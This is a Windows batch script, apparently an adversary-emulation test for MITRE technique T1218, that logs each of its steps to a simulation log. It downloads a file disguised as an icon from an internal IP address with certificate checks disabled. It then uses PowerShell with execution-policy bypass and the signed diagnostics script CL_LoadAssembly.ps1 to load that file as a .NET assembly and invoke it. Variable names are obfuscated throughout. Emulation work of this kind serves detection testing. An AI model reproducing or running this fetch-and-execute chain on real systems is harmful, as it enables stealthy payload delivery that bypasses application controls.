@echo off
setlocal enabledelayedexpansion

REM Placeholder constant declarations (random-named SET vars, one per PHR_*)
SET aBcDeFgH=%APPDATA%\11986\3a7b24f4
SET xYz123Ab=08477b89.txt
SET qWeRtYuI=https://10.0.0.49/stage/2/icon.png?11986-7
SET zXcVbNmK=ITZEL-S2B
SET LkOiUjHy=11986
SET MnBvCxZq=7
SET PlOkIjUh=%PUBLIC%\\macula-simulations.log

REM Cache timestamp once for all debug lines
SET tsvar=%DATE%/%TIME%

REM ---- HEARTBEAT FETCH ----
echo [!tsvar!][DEBUG][!zXcVbNmK!][!LkOiUjHy!]: heartbeat_start>> "!PlOkIjUh!" 2>nul
curl -k -s -o "!aBcDeFgH!\!xYz123Ab!" "!qWeRtYuI!" >nul 2>&1
echo [!tsvar!][DEBUG][!zXcVbNmK!][!LkOiUjHy!]: heartbeat_complete>> "!PlOkIjUh!" 2>nul

REM ---- POSITION WORKING DIRECTORY ----
echo [!tsvar!][DEBUG][!zXcVbNmK!][!LkOiUjHy!]: chdir_start>> "!PlOkIjUh!" 2>nul
cd /d "!aBcDeFgH!" >nul 2>&1
set chdir_result=!errorlevel!
echo [!tsvar!][DEBUG][!zXcVbNmK!][!LkOiUjHy!]: chdir_result=!chdir_result!>> "!PlOkIjUh!" 2>nul

REM ---- POWERSHELL LOLBIN INVOCATION ----
echo [!tsvar!][DEBUG][!zXcVbNmK!][!LkOiUjHy!]: powershell_start>> "!PlOkIjUh!" 2>nul
powershell.exe -ep bypass -command "set-location -path c:\windows\diagnostics\system\networking; import-module .\CL_LoadAssembly.ps1; $n=[AppDomain]::CurrentDomain.GetAssemblies().Count; LoadAssemblyFromPath %APPDATA%\11986\3a7b24f4\08477b89.txt; $asm=([AppDomain]::CurrentDomain.GetAssemblies() | Select-Object -Skip $n -First 1); ($asm.GetExportedTypes() | ForEach-Object { $_.GetMethods([Reflection.BindingFlags]'Public,Static') | Where-Object { $_.GetParameters().Count -eq 0 } } | Select-Object -First 1).Invoke($null,$null)"
set ps_exit=!errorlevel!
echo [!tsvar!][DEBUG][!zXcVbNmK!][!LkOiUjHy!]: powershell_end=!ps_exit!>> "!PlOkIjUh!" 2>nul

REM ---- TTP LOGGING ----
for /f "delims=" %%t in ('powershell -nop -c "Get-Date -Format 'yyyy-MM-dd HH:mm:ss.fff'"') do set ttp_ts=%%t
if !ps_exit! equ 0 (
    echo [!ttp_ts!][TTP][!zXcVbNmK!][!LkOiUjHy!]: T1218^|System Binary Proxy Execution=OK:>> "!PlOkIjUh!" 2>nul
) else (
    echo [!ttp_ts!][TTP][!zXcVbNmK!][!LkOiUjHy!]: T1218^|System Binary Proxy Execution=FAIL:exitcode=!ps_exit!>> "!PlOkIjUh!" 2>nul
)

endlocal